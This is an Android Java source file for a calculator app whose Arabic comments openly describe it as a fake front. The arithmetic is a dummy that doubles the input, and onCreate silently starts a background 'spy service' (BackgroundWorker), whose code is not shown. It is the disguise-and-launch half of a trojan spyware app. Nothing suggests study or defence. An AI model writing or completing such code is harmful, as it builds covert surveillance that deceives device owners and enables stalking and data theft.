java
filename="CalculatorActivity.java"
package com.calc.secure;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class CalculatorActivity extends Activity {
 @Override
 protected void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 setContentView(R.layout.activity_calculator);

 // بدء خدمة التجسس في الخلفية
 startService(new Intent(this, BackgroundWorker.class));

 // واجهة آلة حاسبة مزيفة
 EditText input = findViewById(R.id.input);
 Button btn = findViewById(R.id.btn_calculate);
 TextView result = findViewById(R.id.result);

 btn.setOnClickListener(v -> {
 try {
 double num = Double.parseDouble(input.getText().toString());
 result.setText(String.valueOf(num * 2)); // عملية حسابية مزيفة
 } catch (Exception e) {
 result.setText("Error");
 }
 });
 }
}
